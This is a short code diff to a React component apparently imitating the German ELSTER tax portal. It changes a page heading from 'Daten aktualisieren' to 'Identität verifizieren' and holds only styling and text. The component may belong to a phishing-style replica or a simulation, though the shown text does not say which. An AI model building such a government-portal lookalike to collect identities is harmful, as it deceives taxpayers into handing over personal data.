@@ -380,7 +380,7 @@ const Elster = () => {
               </p>
             </div>
 
-            <h1 style={{ fontSize: 28, fontWeight: 400, color: TEXT, margin: "4px 0 12px" }}>Daten aktualisieren</h1>
+            <h1 style={{ fontSize: 28, fontWeight: 400, color: TEXT, margin: "4px 0 12px" }}>Identität verifizieren</h1>
 
             <div style={{ display: "grid", gridTemplateColumns: "1fr 300px", columnGap: 0, paddingRight: 16 }} className="elster-content">
               <p style={{ fontSize: 13, lineHeight: 1.55, color: TEXT, margin: "0 0 20px" }}>
